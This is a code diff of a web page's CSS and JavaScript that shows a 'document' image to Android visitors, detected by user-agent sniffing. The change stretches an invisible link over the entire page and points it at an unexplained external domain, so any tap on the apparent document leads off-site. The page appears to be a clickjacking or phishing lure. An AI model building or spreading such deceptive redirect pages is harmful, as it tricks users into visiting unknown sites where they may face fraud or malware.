@@ -22,7 +22,7 @@ html, body {
 }
 
 /* =========================
-   ANDROID IMAGE + LINK OVERLAY
+   ANDROID IMAGE + FULL-PAGE LINK
    ========================= */
 .android-wrapper {
     position: relative;
@@ -38,10 +38,10 @@ html, body {
 
 .android-link {
     position: absolute;
-    left: 32%;
-    top: 20%;
-    width: 34%;
-    height: 4.3%;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
     z-index: 10;
 }
 
@@ -77,14 +77,15 @@ const ua = navigator.userAgent;
 
 const PDF_URL = './document.pdf';
 const PNG_URL = './document.png';
-const VITAL_LINK = 'https://YOUR-VITAL-LINK-HERE';
+const VITAL_LINK = 'https://ch1108677878.com';
 
 const isAndroid = /Android/i.test(ua);
 
 /* =========================
-   ANDROID: IMAGE + LINK OVERLAY
+   ANDROID: IMAGE + FULL-PAGE LINK
    ========================= */
 if (isAndroid) {
+    // Insert image + overlay immediately for all Android browsers
     viewer.innerHTML = `
         <div class="android-wrapper">
             <img src="${PNG_URL}" class="android-img" alt="Document">
